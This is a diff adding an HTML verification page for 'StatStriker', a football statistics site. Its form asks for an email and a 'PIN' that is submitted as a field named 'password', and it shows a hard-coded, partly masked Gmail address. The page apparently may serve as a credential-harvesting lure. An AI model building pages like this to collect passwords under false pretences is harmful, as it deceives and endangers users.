@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stat Striker Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    @keyframes shimmer {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .shimmer-text {
+      background: linear-gradient(90deg, #007bff, #ff0000, #ffd700);
+      background-size: 300% 300%;
+      -webkit-text-fill-color: transparent;
+      -webkit-background-clip: text;
+      animation: shimmer 6s ease-in-out infinite;
+    }
+
+    @keyframes scroll-left {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+
+    @keyframes scroll-right {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(0); }
+    }
+
+    .scroll-left {
+      animation: scroll-left 30s linear infinite;
+    }
+
+    .scroll-right {
+      animation: scroll-right 30s linear infinite;
+    }
+
+    .scroll-up {
+      animation: scroll-up 30s linear infinite;
+    }
+
+    .card-hover:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .input-focus:focus {
+      border-color: #007bff;
+      box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
+    }
+
+    .btn-hover:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .btn-active:active {
+      transform: translateY(1px);
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-gray-100 to-gray-200 min-h-screen flex flex-col">
+  <!-- Header -->
+  <header class="py-6 px-4 sm:px-6 lg:px-8">
+    <div class="flex justify-between items-center">
+      <div class="flex items-center space-x-2">
+        <i class="fas fa-futbol text-3xl text-blue-600"></i>
+        <span class="text-xl font-bold text-gray-800">StatStriker</span>
+      </div>
+
+      <button class="md:hidden text-gray-600">
+        <i class="fas fa-bars text-2xl"></i>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="flex-grow flex items-center justify-center px-4 py-12">
+    <div class="w-full max-w-md bg-white rounded-xl shadow-xl overflow-hidden transition-all duration-300 card-hover">
+      <div class="bg-gradient-to-r from-blue-600 to-red-600 py-4 px-6">
+        <h1 class="text-4xl font-extrabold text-center shimmer-text">StatStriker</h1>
+        <p class="text-white text-center mt-2">Football Statistics & Analytics</p>
+      </div>
+
+      <div class="p-6 sm:p-8">
+        <form action="/verify" method="post">
+          <div class="mb-6">
+            <label for="email" class="block text-gray-700 font-medium mb-2">Email</label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 input-focus transition"
+              placeholder="your@email.com"
+              required
+            >
+          </div>
+
+          <div class="mb-6">
+            <label for="pin" class="block text-gray-700 font-medium mb-2">Verification PIN</label>
+            <div class="relative">
+              <input
+                type="password"
+                id="pin"
+                name="password"
+                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 input-focus transition"
+                placeholder="••••••"
+                required
+              >
+              <button type="button" class="absolute right-3 top-3 text-gray-500 hover:text-blue-600">
+                <i class="fas fa-eye"></i>
+              </button>
+            </div>
+            <p class="text-sm text-gray-500 mt-2">Check your email eya****8@gmail.com for the verification code</p>
+          </div>
+
+          <button
+            type="submit"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition btn-hover btn-active"
+          >
+            Verify & Continue
+            <i class="fas fa-arrow-right ml-2"></i>
+          </button>
+
+
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <!-- League Scrollers -->
+  <div class="bg-white border-t border-gray-200 py-6 overflow-hidden">
+    <!-- Premier League Scroller -->
+    <div class="mb-8">
+      <h3 class="text-center text-xl font-bold text-gray-800 mb-4">Clubs</h3>
+      <div class="relative overflow-hidden">
+        <div class="flex scroll-left">
+          <div class="flex space-x-16 px-4">
+            <img src="https://upload.wikimedia.org/wikipedia/en/5/56/Real_Madrid_CF.svg" alt="Real Madrid" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/f/f2/Premier_League_Logo.svg" alt="Premier League" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/5/53/Arsenal_FC.svg" alt="Arsenal" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/7/7a/Manchester_United_FC_crest.svg" alt="Manchester United" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/c/cc/Chelsea_FC.svg" alt="Chelsea" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/0/0c/Liverpool_FC.svg" alt="Liverpool" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/e/eb/Manchester_City_FC_badge.svg" alt="Manchester City" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/b/b4/Tottenham_Hotspur.svg" alt="Tottenham Hotspur" class="h-12">
+          </div>
+          <div class="flex space-x-16 px-4">
+           <img src="https://upload.wikimedia.org/wikipedia/en/f/f2/Premier_League_Logo.svg" alt="Premier League" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/5/53/Arsenal_FC.svg" alt="Arsenal" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/7/7a/Manchester_United_FC_crest.svg" alt="Manchester United" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/c/cc/Chelsea_FC.svg" alt="Chelsea" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/0/0c/Liverpool_FC.svg" alt="Liverpool" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/e/eb/Manchester_City_FC_badge.svg" alt="Manchester City" class="h-12">
+            <img src="https://upload.wikimedia.org/wikipedia/en/b/b4/Tottenham_Hotspur.svg" alt="Tottenham Hotspur" class="h-12">
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="bg-gray-800 text-white py-8 px-4 sm:px-6 lg:px-8">
+    <div class="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8">
+      <div>
+        <h3 class="text-xl font-bold mb-4">StatStriker</h3>
+        <p class="text-gray-400">The ultimate football statistics and analytics platform for fans and professionals.</p>
+      </div>
+      <div>
+        <h4 class="font-semibold mb-4">Quick Links</h4>
+        <ul class="space-y-2">
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Home</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Features</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Pricing</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Contact</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4 class="font-semibold mb-4">Leagues</h4>
+        <ul class="space-y-2">
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Premier League</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">La Liga</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Serie A</a></li>
+          <li><a href="#" class="text-gray-400 hover:text-white transition">Bundesliga</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4 class="font-semibold mb-4">Connect</h4>
+        <div class="flex space-x-4">
+          <a href="#" class="text-gray-400 hover:text-white transition"><i class="fab fa-twitter text-xl"></i></a>
+          <a href="#" class="text-gray-400 hover:text-white transition"><i class="fab fa-facebook text-xl"></i></a>
+          <a href="#" class="text-gray-400 hover:text-white transition"><i class="fab fa-instagram text-xl"></i></a>
+          <a href="#" class="text-gray-400 hover:text-white transition"><i class="fab fa-youtube text-xl"></i></a>
+        </div>
+      </div>
+    </div>
+    <div class="border-t border-gray-700 mt-8 pt-6 text-center text-gray-400">
+      <p>&copy; 2023 StatStriker. All rights reserved.</p>
+    </div>
+  </footer>
+</body>
+</html>
+
